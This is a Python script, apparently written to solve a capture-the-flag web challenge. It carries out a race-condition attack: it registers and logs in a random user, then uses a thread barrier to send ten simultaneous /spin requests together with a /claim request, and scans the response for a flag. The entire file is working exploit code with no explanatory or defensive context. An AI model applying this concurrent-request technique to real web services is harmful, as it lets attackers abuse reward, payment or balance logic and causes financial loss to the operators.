import requests, threading, time, random, string

base = 'https://web-random-cheese.tracebash.xyz'

def race_attack():
    # Create a user
    s = requests.Session()
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    s.post(f'{base}/register', data={'username': name, 'password': name})
    s.post(f'{base}/login', data={'username': name, 'password': name})
    
    # Get initial state
    r = s.post(f'{base}/spin')
    
    # Thread barrier - all start at once
    barrier = threading.Barrier(11)
    result = [None]
    
    def do_spin(idx):
        barrier.wait()
        r = s.post(f'{base}/spin')
    
    def do_claim():
        barrier.wait()
        r = s.post(f'{base}/claim')
        result[0] = r.text
    
    # Start 10 spin threads + 1 claim thread
    threads = []
    for i in range(10):
        t = threading.Thread(target=do_spin, args=(i,))
        threads.append(t)
        t.start()
    
    ct = threading.Thread(target=do_claim)
    ct.start()
    threads.append(ct)
    
    for t in threads:
        t.join()
    
    return result[0]

for i in range(5):
    text = race_attack()
    if text and 'CTF' in text[:10000] or 'flag{' in text[:10000]:
        # Extract flag
        import re
        for match in re.findall(r'[A-Z]{3,}\{[^}]+\}', text[:5000]):
            print(f'FLAG: {match}')
        # Also search for CTF{...}
        for match in re.findall(r'CTF\{[^}]+\}', text[:5000]):
            print(f'FLAG2: {match}')
        print('Text length:', len(text))
        print(text[:2000])
        break
    else:
        # Check status
        msgs = [l for l in text.split(chr(10)) if 'span' in l]
        for m in msgs[:5]:
            import re
            spans = re.findall(r'<span[^>]*>([^<]+)', m)
            for s in spans:
                print('Msg:', s.encode('ascii', errors='replace'))